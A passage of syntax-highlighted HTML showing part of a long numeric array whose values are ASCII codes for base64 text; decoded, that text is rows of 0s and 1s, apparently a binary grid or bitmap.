class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span 